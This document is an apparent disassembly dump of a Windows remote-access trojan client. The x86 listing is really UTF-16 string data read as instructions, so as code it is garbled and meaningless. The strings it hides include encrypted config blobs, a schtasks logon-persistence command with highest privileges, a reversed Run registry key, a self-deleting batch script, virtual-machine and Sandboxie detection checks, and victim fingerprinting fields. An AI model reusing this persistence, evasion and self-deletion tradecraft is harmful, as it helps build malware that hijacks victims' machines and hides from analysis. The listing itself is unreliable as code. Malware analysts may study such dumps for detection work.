  40be5c:	48                   	dec    %eax
  40be5d:	00 36                	add    %dh,(%esi)
  40be5f:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40be63:	00 67 00             	add    %ah,0x0(%edi)
  40be66:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40be6a:	35 00 34 00 68       	xor    $0x68003400,%eax
  40be6f:	00 37                	add    %dh,(%edi)
  40be71:	00 42 00             	add    %al,0x0(%edx)
  40be74:	79 00                	jns    0x40be76
  40be76:	58                   	pop    %eax
  40be77:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40be7b:	00 33                	add    %dh,(%ebx)
  40be7d:	00 6a 00             	add    %ch,0x0(%edx)
  40be80:	73 00                	jae    0x40be82
  40be82:	6a 00                	push   $0x0
  40be84:	4a                   	dec    %edx
  40be85:	00 6b 00             	add    %ch,0x0(%ebx)
  40be88:	45                   	inc    %ebp
  40be89:	00 6e 00             	add    %ch,0x0(%esi)
  40be8c:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  40be90:	63 00                	arpl   %eax,(%eax)
  40be92:	36 00 54 00 6d       	add    %dl,%ss:0x6d(%eax,%eax,1)
  40be97:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40be9b:	00 79 00             	add    %bh,0x0(%ecx)
  40be9e:	6d                   	insl   (%dx),%es:(%edi)
  40be9f:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  40bea3:	00 41 00             	add    %al,0x0(%ecx)
  40bea6:	6d                   	insl   (%dx),%es:(%edi)
  40bea7:	00 77 00             	add    %dh,0x0(%edi)
  40beaa:	54                   	push   %esp
  40beab:	00 38                	add    %bh,(%eax)
  40bead:	00 77 00             	add    %dh,0x0(%edi)
  40beb0:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40beb5:	80 b1 63 00 46 00 67 	xorb   $0x67,0x460063(%ecx)
  40bebc:	00 55 00             	add    %dl,0x0(%ebp)
  40bebf:	4d                   	dec    %ebp
  40bec0:	00 55 00             	add    %dl,0x0(%ebp)
  40bec3:	34 00                	xor    $0x0,%al
  40bec5:	72 00                	jb     0x40bec7
  40bec7:	76 00                	jbe    0x40bec9
  40bec9:	75 00                	jne    0x40becb
  40becb:	4c                   	dec    %esp
  40becc:	00 52 00             	add    %dl,0x0(%edx)
  40becf:	55                   	push   %ebp
  40bed0:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40bed4:	00 42 00             	add    %al,0x0(%edx)
  40bed7:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40beda:	00 66 00             	add    %ah,0x0(%esi)
  40bedd:	77 00                	ja     0x40bedf
  40bedf:	49                   	dec    %ecx
  40bee0:	00 65 00             	add    %ah,0x0(%ebp)
  40bee3:	78 00                	js     0x40bee5
  40bee5:	70 00                	jo     0x40bee7
  40bee7:	63 00                	arpl   %eax,(%eax)
  40bee9:	7a 00                	jp     0x40beeb
  40beeb:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40beef:	78 00                	js     0x40bef1
  40bef1:	32 00                	xor    (%eax),%al
  40bef3:	54                   	push   %esp
  40bef4:	00 79 00             	add    %bh,0x0(%ecx)
  40bef7:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40befb:	41                   	inc    %ecx
  40befc:	00 43 00             	add    %al,0x0(%ebx)
  40beff:	48                   	dec    %eax
  40bf00:	00 49 00             	add    %cl,0x0(%ecx)
  40bf03:	34 00                	xor    $0x0,%al
  40bf05:	77 00                	ja     0x40bf07
  40bf07:	55                   	push   %ebp
  40bf08:	00 79 00             	add    %bh,0x0(%ecx)
  40bf0b:	57                   	push   %edi
  40bf0c:	00 32                	add    %dh,(%edx)
  40bf0e:	00 79 00             	add    %bh,0x0(%ecx)
  40bf11:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf12:	00 53 00             	add    %dl,0x0(%ebx)
  40bf15:	35 00 6d 00 6d       	xor    $0x6d006d00,%eax
  40bf1a:	00 52 00             	add    %dl,0x0(%edx)
  40bf1d:	73 00                	jae    0x40bf1f
  40bf1f:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40bf23:	73 00                	jae    0x40bf25
  40bf25:	6c                   	insb   (%dx),%es:(%edi)
  40bf26:	00 65 00             	add    %ah,0x0(%ebp)
  40bf29:	44                   	inc    %esp
  40bf2a:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf2d:	69 00 38 00 6f 00    	imul   $0x6f0038,(%eax),%eax
  40bf33:	30 00                	xor    %al,(%eax)
  40bf35:	55                   	push   %ebp
  40bf36:	00 6e 00             	add    %ch,0x0(%esi)
  40bf39:	43                   	inc    %ebx
  40bf3a:	00 77 00             	add    %dh,0x0(%edi)
  40bf3d:	57                   	push   %edi
  40bf3e:	00 4c 00 79          	add    %cl,0x79(%eax,%eax,1)
  40bf42:	00 6f 00             	add    %ch,0x0(%edi)
  40bf45:	4c                   	dec    %esp
  40bf46:	00 67 00             	add    %ah,0x0(%edi)
  40bf49:	79 00                	jns    0x40bf4b
  40bf4b:	4e                   	dec    %esi
  40bf4c:	00 62 00             	add    %ah,0x0(%edx)
  40bf4f:	62 00                	bound  %eax,(%eax)
  40bf51:	53                   	push   %ebx
  40bf52:	00 46 00             	add    %al,0x0(%esi)
  40bf55:	39 00                	cmp    %eax,(%eax)
  40bf57:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40bf5b:	39 00                	cmp    %eax,(%eax)
  40bf5d:	39 00                	cmp    %eax,(%eax)
  40bf5f:	61                   	popa
  40bf60:	00 67 00             	add    %ah,0x0(%edi)
  40bf63:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bf68:	80 b1 55 00 2f 00 4b 	xorb   $0x4b,0x2f0055(%ecx)
  40bf6f:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  40bf73:	00 63 00             	add    %ah,0x0(%ebx)
  40bf76:	69 00 63 00 77 00    	imul   $0x770063,(%eax),%eax
  40bf7c:	7a 00                	jp     0x40bf7e
  40bf7e:	33 00                	xor    (%eax),%eax
  40bf80:	38 00                	cmp    %al,(%eax)
  40bf82:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bf86:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf87:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40bf8b:	00 51 00             	add    %dl,0x0(%ecx)
  40bf8e:	39 00                	cmp    %eax,(%eax)
  40bf90:	58                   	pop    %eax
  40bf91:	00 33                	add    %dh,(%ebx)
  40bf93:	00 69 00             	add    %ch,0x0(%ecx)
  40bf96:	35 00 52 00 35       	xor    $0x35005200,%eax
  40bf9b:	00 4e 00             	add    %cl,0x0(%esi)
  40bf9e:	46                   	inc    %esi
  40bf9f:	00 49 00             	add    %cl,0x0(%ecx)
  40bfa2:	59                   	pop    %ecx
  40bfa3:	00 32                	add    %dh,(%edx)
  40bfa5:	00 47 00             	add    %al,0x0(%edi)
  40bfa8:	48                   	dec    %eax
  40bfa9:	00 7a 00             	add    %bh,0x0(%edx)
  40bfac:	71 00                	jno    0x40bfae
  40bfae:	39 00                	cmp    %eax,(%eax)
  40bfb0:	45                   	inc    %ebp
  40bfb1:	00 5a 00             	add    %bl,0x0(%edx)
  40bfb4:	4f                   	dec    %edi
  40bfb5:	00 71 00             	add    %dh,0x0(%ecx)
  40bfb8:	41                   	inc    %ecx
  40bfb9:	00 75 00             	add    %dh,0x0(%ebp)
  40bfbc:	77 00                	ja     0x40bfbe
  40bfbe:	58                   	pop    %eax
  40bfbf:	00 77 00             	add    %dh,0x0(%edi)
  40bfc2:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40bfc6:	62 00                	bound  %eax,(%eax)
  40bfc8:	6c                   	insb   (%dx),%es:(%edi)
  40bfc9:	00 67 00             	add    %ah,0x0(%edi)
  40bfcc:	4a                   	dec    %edx
  40bfcd:	00 73 00             	add    %dh,0x0(%ebx)
  40bfd0:	32 00                	xor    (%eax),%al
  40bfd2:	79 00                	jns    0x40bfd4
  40bfd4:	79 00                	jns    0x40bfd6
  40bfd6:	55                   	push   %ebp
  40bfd7:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40bfdb:	00 48 00             	add    %cl,0x0(%eax)
  40bfde:	62 00                	bound  %eax,(%eax)
  40bfe0:	6f                   	outsl  %ds:(%esi),(%dx)
  40bfe1:	00 6b 00             	add    %ch,0x0(%ebx)
  40bfe4:	54                   	push   %esp
  40bfe5:	00 2f                	add    %ch,(%edi)
  40bfe7:	00 6e 00             	add    %ch,0x0(%esi)
  40bfea:	34 00                	xor    $0x0,%al
  40bfec:	4a                   	dec    %edx
  40bfed:	00 32                	add    %dh,(%edx)
  40bfef:	00 30                	add    %dh,(%eax)
  40bff1:	00 55 00             	add    %dl,0x0(%ebp)
  40bff4:	61                   	popa
  40bff5:	00 57 00             	add    %dl,0x0(%edi)
  40bff8:	58                   	pop    %eax
  40bff9:	00 41 00             	add    %al,0x0(%ecx)
  40bffc:	70 00                	jo     0x40bffe
  40bffe:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfff:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40c003:	00 58 00             	add    %bl,0x0(%eax)
  40c006:	62 00                	bound  %eax,(%eax)
  40c008:	6b 00 50             	imul   $0x50,(%eax),%eax
  40c00b:	00 68 00             	add    %ch,0x0(%eax)
  40c00e:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40c012:	31 00                	xor    %eax,(%eax)
  40c014:	67 00 3d             	add    %bh,(%di)
  40c017:	00 3d 00 00 03 33    	add    %bh,0x33030000
  40c01d:	00 00                	add    %al,(%eax)
  40c01f:	80 b1 79 00 69 00 4c 	xorb   $0x4c,0x690079(%ecx)
  40c026:	00 38                	add    %bh,(%eax)
  40c028:	00 6d 00             	add    %ch,0x0(%ebp)
  40c02b:	54                   	push   %esp
  40c02c:	00 79 00             	add    %bh,0x0(%ecx)
  40c02f:	56                   	push   %esi
  40c030:	00 6b 00             	add    %ch,0x0(%ebx)
  40c033:	58                   	pop    %eax
  40c034:	00 50 00             	add    %dl,0x0(%eax)
  40c037:	6d                   	insl   (%dx),%es:(%edi)
  40c038:	00 39                	add    %bh,(%ecx)
  40c03a:	00 7a 00             	add    %bh,0x0(%edx)
  40c03d:	75 00                	jne    0x40c03f
  40c03f:	38 00                	cmp    %al,(%eax)
  40c041:	46                   	inc    %esi
  40c042:	00 78 00             	add    %bh,0x0(%eax)
  40c045:	77 00                	ja     0x40c047
  40c047:	58                   	pop    %eax
  40c048:	00 61 00             	add    %ah,0x0(%ecx)
  40c04b:	33 00                	xor    (%eax),%eax
  40c04d:	4b                   	dec    %ebx
  40c04e:	00 50 00             	add    %dl,0x0(%eax)
  40c051:	33 00                	xor    (%eax),%eax
  40c053:	56                   	push   %esi
  40c054:	00 2f                	add    %ch,(%edi)
  40c056:	00 62 00             	add    %ah,0x0(%edx)
  40c059:	49                   	dec    %ecx
  40c05a:	00 79 00             	add    %bh,0x0(%ecx)
  40c05d:	44                   	inc    %esp
  40c05e:	00 7a 00             	add    %bh,0x0(%edx)
  40c061:	48                   	dec    %eax
  40c062:	00 67 00             	add    %ah,0x0(%edi)
  40c065:	34 00                	xor    $0x0,%al
  40c067:	69 00 46 00 42 00    	imul   $0x420046,(%eax),%eax
  40c06d:	55                   	push   %ebp
  40c06e:	00 31                	add    %dh,(%ecx)
  40c070:	00 66 00             	add    %ah,0x0(%esi)
  40c073:	7a 00                	jp     0x40c075
  40c075:	38 00                	cmp    %al,(%eax)
  40c077:	4e                   	dec    %esi
  40c078:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40c07c:	00 31                	add    %dh,(%ecx)
  40c07e:	00 78 00             	add    %bh,0x0(%eax)
  40c081:	56                   	push   %esi
  40c082:	00 50 00             	add    %dl,0x0(%eax)
  40c085:	4e                   	dec    %esi
  40c086:	00 59 00             	add    %bl,0x0(%ecx)
  40c089:	68 00 4d 00 62       	push   $0x62004d00
  40c08e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c091:	30 00                	xor    %al,(%eax)
  40c093:	4d                   	dec    %ebp
  40c094:	00 41 00             	add    %al,0x0(%ecx)
  40c097:	70 00                	jo     0x40c099
  40c099:	47                   	inc    %edi
  40c09a:	00 4a 00             	add    %cl,0x0(%edx)
  40c09d:	6d                   	insl   (%dx),%es:(%edi)
  40c09e:	00 65 00             	add    %ah,0x0(%ebp)
  40c0a1:	55                   	push   %ebp
  40c0a2:	00 4d 00             	add    %cl,0x0(%ebp)
  40c0a5:	59                   	pop    %ecx
  40c0a6:	00 65 00             	add    %ah,0x0(%ebp)
  40c0a9:	38 00                	cmp    %al,(%eax)
  40c0ab:	76 00                	jbe    0x40c0ad
  40c0ad:	47                   	inc    %edi
  40c0ae:	00 4d 00             	add    %cl,0x0(%ebp)
  40c0b1:	42                   	inc    %edx
  40c0b2:	00 79 00             	add    %bh,0x0(%ecx)
  40c0b5:	63 00                	arpl   %eax,(%eax)
  40c0b7:	49                   	dec    %ecx
  40c0b8:	00 39                	add    %bh,(%ecx)
  40c0ba:	00 59 00             	add    %bl,0x0(%ecx)
  40c0bd:	73 00                	jae    0x40c0bf
  40c0bf:	73 00                	jae    0x40c0c1
  40c0c1:	32 00                	xor    (%eax),%al
  40c0c3:	47                   	inc    %edi
  40c0c4:	00 6d 00             	add    %ch,0x0(%ebp)
  40c0c7:	6d                   	insl   (%dx),%es:(%edi)
  40c0c8:	00 79 00             	add    %bh,0x0(%ecx)
  40c0cb:	67 00 3d             	add    %bh,(%di)
  40c0ce:	00 3d 00 00 09 6e    	add    %bh,0x6e090000
  40c0d4:	00 75 00             	add    %dh,0x0(%ebp)
  40c0d7:	6c                   	insb   (%dx),%es:(%edi)
  40c0d8:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c0dc:	01 00                	add    %eax,(%eax)
  40c0de:	03 3a                	add    (%edx),%edi
  40c0e0:	00 00                	add    %al,(%eax)
  40c0e2:	0d 50 00 61 00       	or     $0x610050,%eax
  40c0e7:	63 00                	arpl   %eax,(%eax)
  40c0e9:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c0ec:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c0f0:	09 50 00             	or     %edx,0x0(%eax)
  40c0f3:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c0f9:	00 0f                	add    %cl,(%edi)
  40c0fb:	4d                   	dec    %ebp
  40c0fc:	00 65 00             	add    %ah,0x0(%ebp)
  40c0ff:	73 00                	jae    0x40c101
  40c101:	73 00                	jae    0x40c103
  40c103:	61                   	popa
  40c104:	00 67 00             	add    %ah,0x0(%edi)
  40c107:	65 00 00             	add    %al,%gs:(%eax)
  40c10a:	07                   	pop    %es
  40c10b:	63 00                	arpl   %eax,(%eax)
  40c10d:	6d                   	insl   (%dx),%es:(%edi)
  40c10e:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c112:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c118:	00 73 00             	add    %dh,0x0(%ebx)
  40c11b:	63 00                	arpl   %eax,(%eax)
  40c11d:	68 00 74 00 61       	push   $0x61007400
  40c122:	00 73 00             	add    %dh,0x0(%ebx)
  40c125:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c128:	00 20                	add    %ah,(%eax)
  40c12a:	00 2f                	add    %ch,(%edi)
  40c12c:	00 63 00             	add    %ah,0x0(%ebx)
  40c12f:	72 00                	jb     0x40c131
  40c131:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c135:	74 00                	je     0x40c137
  40c137:	65 00 20             	add    %ah,%gs:(%eax)
  40c13a:	00 2f                	add    %ch,(%edi)
  40c13c:	00 66 00             	add    %ah,0x0(%esi)
  40c13f:	20 00                	and    %al,(%eax)
  40c141:	2f                   	das
  40c142:	00 73 00             	add    %dh,0x0(%ebx)
  40c145:	63 00                	arpl   %eax,(%eax)
  40c147:	20 00                	and    %al,(%eax)
  40c149:	6f                   	outsl  %ds:(%esi),(%dx)
  40c14a:	00 6e 00             	add    %ch,0x0(%esi)
  40c14d:	6c                   	insb   (%dx),%es:(%edi)
  40c14e:	00 6f 00             	add    %ch,0x0(%edi)
  40c151:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c155:	6e                   	outsb  %ds:(%esi),(%dx)
  40c156:	00 20                	add    %ah,(%eax)
  40c158:	00 2f                	add    %ch,(%edi)
  40c15a:	00 72 00             	add    %dh,0x0(%edx)
  40c15d:	6c                   	insb   (%dx),%es:(%edi)
  40c15e:	00 20                	add    %ah,(%eax)
  40c160:	00 68 00             	add    %ch,0x0(%eax)
  40c163:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c169:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c16d:	74 00                	je     0x40c16f
  40c16f:	20 00                	and    %al,(%eax)
  40c171:	2f                   	das
  40c172:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c176:	00 20                	add    %ah,(%eax)
  40c178:	00 22                	add    %ah,(%edx)
  40c17a:	00 00                	add    %al,(%eax)
  40c17c:	11 22                	adc    %esp,(%edx)
  40c17e:	00 20                	add    %ah,(%eax)
  40c180:	00 2f                	add    %ch,(%edi)
  40c182:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c186:	00 20                	add    %ah,(%eax)
  40c188:	00 27                	add    %ah,(%edi)
  40c18a:	00 22                	add    %ah,(%edx)
  40c18c:	00 01                	add    %al,(%ecx)
  40c18e:	13 22                	adc    (%edx),%esp
  40c190:	00 27                	add    %ah,(%edi)
  40c192:	00 20                	add    %ah,(%eax)
  40c194:	00 26                	add    %ah,(%esi)
  40c196:	00 20                	add    %ah,(%eax)
  40c198:	00 65 00             	add    %ah,0x0(%ebp)
  40c19b:	78 00                	js     0x40c19d
  40c19d:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1a3:	5c                   	pop    %esp
  40c1a4:	00 6e 00             	add    %ch,0x0(%esi)
  40c1a7:	75 00                	jne    0x40c1a9
  40c1a9:	52                   	push   %edx
  40c1aa:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c1ae:	00 6f 00             	add    %ch,0x0(%edi)
  40c1b1:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1b7:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1bb:	74 00                	je     0x40c1bd
  40c1bd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1be:	00 65 00             	add    %ah,0x0(%ebp)
  40c1c1:	72 00                	jb     0x40c1c3
  40c1c3:	72 00                	jb     0x40c1c5
  40c1c5:	75 00                	jne    0x40c1c7
  40c1c7:	43                   	inc    %ebx
  40c1c8:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c1cc:	00 77 00             	add    %dh,0x0(%edi)
  40c1cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1d0:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c1d4:	00 69 00             	add    %ch,0x0(%ecx)
  40c1d7:	57                   	push   %edi
  40c1d8:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c1dc:	00 66 00             	add    %ah,0x0(%esi)
  40c1df:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1e0:	00 73 00             	add    %dh,0x0(%ebx)
  40c1e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1e4:	00 72 00             	add    %dh,0x0(%edx)
  40c1e7:	63 00                	arpl   %eax,(%eax)
  40c1e9:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c1ef:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c1f3:	61                   	popa
  40c1f4:	00 77 00             	add    %dh,0x0(%edi)
  40c1f7:	74 00                	je     0x40c1f9
  40c1f9:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c1fd:	53                   	push   %ebx
  40c1fe:	00 00                	add    %al,(%eax)
  40c200:	03 22                	add    (%edx),%esp
  40c202:	00 00                	add    %al,(%eax)
  40c204:	09 2e                	or     %ebp,(%esi)
  40c206:	00 62 00             	add    %ah,0x0(%edx)
  40c209:	61                   	popa
  40c20a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c20e:	13 40 00             	adc    0x0(%eax),%eax
  40c211:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c215:	68 00 6f 00 20       	push   $0x20006f00
  40c21a:	00 6f 00             	add    %ch,0x0(%edi)
  40c21d:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c221:	00 1f                	add    %bl,(%edi)
  40c223:	74 00                	je     0x40c225
  40c225:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c22b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c22c:	00 75 00             	add    %dh,0x0(%ebp)
  40c22f:	74 00                	je     0x40c231
  40c231:	20 00                	and    %al,(%eax)
  40c233:	33 00                	xor    (%eax),%eax
  40c235:	20 00                	and    %al,(%eax)
  40c237:	3e 00 20             	add    %ah,%ds:(%eax)
  40c23a:	00 4e 00             	add    %cl,0x0(%esi)
  40c23d:	55                   	push   %ebp
  40c23e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c242:	15 53 00 54 00       	adc    $0x540053,%eax
  40c247:	41                   	inc    %ecx
  40c248:	00 52 00             	add    %dl,0x0(%edx)
  40c24b:	54                   	push   %esp
  40c24c:	00 20                	add    %ah,(%eax)
  40c24e:	00 22                	add    %ah,(%edx)
  40c250:	00 22                	add    %ah,(%edx)
  40c252:	00 20                	add    %ah,(%eax)
  40c254:	00 22                	add    %ah,(%edx)
  40c256:	00 00                	add    %al,(%eax)
  40c258:	07                   	pop    %es
  40c259:	43                   	inc    %ebx
  40c25a:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c25e:	00 00                	add    %al,(%eax)
  40c260:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c264:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c268:	00 22                	add    %ah,(%edx)
  40c26a:	00 00                	add    %al,(%eax)
  40c26c:	0f 22 00             	mov    %eax,%cr0
  40c26f:	20 00                	and    %al,(%eax)
  40c271:	2f                   	das
  40c272:	00 66 00             	add    %ah,0x0(%esi)
  40c275:	20 00                	and    %al,(%eax)
  40c277:	2f                   	das
  40c278:	00 71 00             	add    %dh,0x0(%ecx)
  40c27b:	00 05 78 00 70 00    	add    %al,0x700078
  40c281:	00 45 53             	add    %al,0x53(%ebp)
  40c284:	00 65 00             	add    %ah,0x0(%ebp)
  40c287:	6c                   	insb   (%dx),%es:(%edi)
  40c288:	00 65 00             	add    %ah,0x0(%ebp)
  40c28b:	63 00                	arpl   %eax,(%eax)
  40c28d:	74 00                	je     0x40c28f
  40c28f:	20 00                	and    %al,(%eax)
  40c291:	2a 00                	sub    (%eax),%al
  40c293:	20 00                	and    %al,(%eax)
  40c295:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c299:	6f                   	outsl  %ds:(%esi),(%dx)
  40c29a:	00 6d 00             	add    %ch,0x0(%ebp)
  40c29d:	20 00                	and    %al,(%eax)
  40c29f:	57                   	push   %edi
  40c2a0:	00 69 00             	add    %ch,0x0(%ecx)
  40c2a3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2a4:	00 33                	add    %dh,(%ebx)
  40c2a6:	00 32                	add    %dh,(%edx)
  40c2a8:	00 5f 00             	add    %bl,0x0(%edi)
  40c2ab:	43                   	inc    %ebx
  40c2ac:	00 6f 00             	add    %ch,0x0(%edi)
  40c2af:	6d                   	insl   (%dx),%es:(%edi)
  40c2b0:	00 70 00             	add    %dh,0x0(%eax)
  40c2b3:	75 00                	jne    0x40c2b5
  40c2b5:	74 00                	je     0x40c2b7
  40c2b7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2bb:	53                   	push   %ebx
  40c2bc:	00 79 00             	add    %bh,0x0(%ecx)
  40c2bf:	73 00                	jae    0x40c2c1
  40c2c1:	74 00                	je     0x40c2c3
  40c2c3:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2c7:	00 19                	add    %bl,(%ecx)
  40c2c9:	4d                   	dec    %ebp
  40c2ca:	00 61 00             	add    %ah,0x0(%ecx)
  40c2cd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2ce:	00 75 00             	add    %dh,0x0(%ebp)
  40c2d1:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c2d5:	63 00                	arpl   %eax,(%eax)
  40c2d7:	74 00                	je     0x40c2d9
  40c2d9:	75 00                	jne    0x40c2db
  40c2db:	72 00                	jb     0x40c2dd
  40c2dd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2e1:	00 2b                	add    %ch,(%ebx)
  40c2e3:	6d                   	insl   (%dx),%es:(%edi)
  40c2e4:	00 69 00             	add    %ch,0x0(%ecx)
  40c2e7:	63 00                	arpl   %eax,(%eax)
  40c2e9:	72 00                	jb     0x40c2eb
  40c2eb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2ec:	00 73 00             	add    %dh,0x0(%ebx)
  40c2ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2f0:	00 66 00             	add    %ah,0x0(%esi)
  40c2f3:	74 00                	je     0x40c2f5
  40c2f5:	20 00                	and    %al,(%eax)
  40c2f7:	63 00                	arpl   %eax,(%eax)
  40c2f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2fa:	00 72 00             	add    %dh,0x0(%edx)
  40c2fd:	70 00                	jo     0x40c2ff
  40c2ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40c300:	00 72 00             	add    %dh,0x0(%edx)
  40c303:	61                   	popa
  40c304:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c308:	00 6f 00             	add    %ch,0x0(%edi)
  40c30b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c30c:	00 00                	add    %al,(%eax)
  40c30e:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c311:	6f                   	outsl  %ds:(%esi),(%dx)
  40c312:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c316:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c31a:	0f 56 00             	orps   (%eax),%xmm0
  40c31d:	49                   	dec    %ecx
  40c31e:	00 52 00             	add    %dl,0x0(%edx)
  40c321:	54                   	push   %esp
  40c322:	00 55 00             	add    %dl,0x0(%ebp)
  40c325:	41                   	inc    %ecx
  40c326:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c32a:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c32f:	77 00                	ja     0x40c331
  40c331:	61                   	popa
  40c332:	00 72 00             	add    %dh,0x0(%edx)
  40c335:	65 00 00             	add    %al,%gs:(%eax)
  40c338:	15 56 00 69 00       	adc    $0x690056,%eax
  40c33d:	72 00                	jb     0x40c33f
  40c33f:	74 00                	je     0x40c341
  40c341:	75 00                	jne    0x40c343
  40c343:	61                   	popa
  40c344:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c348:	00 6f 00             	add    %ch,0x0(%edi)
  40c34b:	78 00                	js     0x40c34d
  40c34d:	00 17                	add    %dl,(%edi)
  40c34f:	53                   	push   %ebx
  40c350:	00 62 00             	add    %ah,0x0(%edx)
  40c353:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c359:	6c                   	insb   (%dx),%es:(%edi)
  40c35a:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c35e:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c362:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c366:	11 45 00             	adc    %eax,0x0(%ebp)
  40c369:	72 00                	jb     0x40c36b
  40c36b:	72 00                	jb     0x40c36d
  40c36d:	20 00                	and    %al,(%eax)
  40c36f:	48                   	dec    %eax
  40c370:	00 57 00             	add    %dl,0x0(%edi)
  40c373:	49                   	dec    %ecx
  40c374:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c378:	05 78 00 32 00       	add    $0x320078,%eax
  40c37d:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c383:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c389:	74 00                	je     0x40c38b
  40c38b:	49                   	dec    %ecx
  40c38c:	00 6e 00             	add    %ch,0x0(%esi)
  40c38f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c393:	00 09                	add    %cl,(%ecx)
  40c395:	48                   	dec    %eax
  40c396:	00 57 00             	add    %dl,0x0(%edi)
  40c399:	49                   	dec    %ecx
  40c39a:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c39e:	09 55 00             	or     %edx,0x0(%ebp)
  40c3a1:	73 00                	jae    0x40c3a3
  40c3a3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3a7:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c3ad:	00 13                	add    %dl,(%ebx)
  40c3af:	4d                   	dec    %ebp
  40c3b0:	00 69 00             	add    %ch,0x0(%ecx)
  40c3b3:	63 00                	arpl   %eax,(%eax)
  40c3b5:	72 00                	jb     0x40c3b7
  40c3b7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3b8:	00 73 00             	add    %dh,0x0(%ebx)
  40c3bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3bc:	00 66 00             	add    %ah,0x0(%esi)
  40c3bf:	74 00                	je     0x40c3c1
  40c3c1:	00 03                	add    %al,(%ebx)
